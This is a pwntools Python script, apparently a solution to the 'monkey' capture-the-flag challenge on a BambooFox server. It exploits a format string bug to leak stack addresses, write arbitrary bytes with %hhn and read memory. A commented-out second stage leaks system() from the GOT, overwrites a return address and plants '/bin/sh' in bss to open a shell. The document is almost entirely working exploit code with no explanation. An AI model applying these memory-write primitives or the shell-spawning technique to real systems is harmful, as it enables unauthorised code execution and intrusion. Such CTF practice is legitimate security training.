from pwn import *

# p = process("./monkey")
p = remote("bamboofox.cs.nctu.edu.tw", 11000)


def printf(s: bytes):
    p.sendlineafter(b"Please enter your choice!\n", "2")
    p.sendlineafter(b"I will print it out.\n", s)
    return p.recvline()


def change_name(s: bytes):
    p.sendlineafter(b"Please enter your choice!\n", "1")
    p.sendline(s)


def write_byte(addr: int, val: int):
    # change_name(p64(addr))
    change_name(p32(addr))
    if val > 0:
        printf(b"%0" + str(val).encode() + b"d%274$hhn")
    else:
        printf(b"%274$hhn")


def write_int(addr: int, val: int):
    while val > 0:
        # print(f"write {hex(val & 0xff)} to {hex(addr)}")
        write_byte(addr, val & 0xFF)
        val >>= 8
        addr += 1


def read_string(addr: int):
    change_name(p64(addr))
    result = printf(b"%274$sc8763c8763")
    return result.split(b"c8763c8763")[0]


def read_dword(addr: int, deep=1):
    if deep == 4:
        return 0
    r = int.from_bytes(read_string(addr)[:4], byteorder="little")
    return r if r != 0 else ((read_dword(addr + 1, deep + 1) & 0xFFFFFF) << 8)


# FLAG 1
target_banana = 0x3132000A
banana_addr = int(printf(b"%269$p").decode().strip(), 16) + 4
write_int(banana_addr, target_banana)
p.sendlineafter(b"Please enter your choice!\n", "3")
print(p.recvline().decode())

# # FLAG 2 (Shell)
# elf = ELF("./monkey")
# system = read_dword(elf.got["system"])
# ret = banana_addr + 0x28
# write_int(ret, system)
# binsh = 0x804A064  # a padding in bss
# write_int(binsh, int.from_bytes(b"/bin/sh\x00a", byteorder="little"))
# write_int(ret + 8, binsh)
# p.sendlineafter(b"Please enter your choice!\n", "5")
# p.interactive()
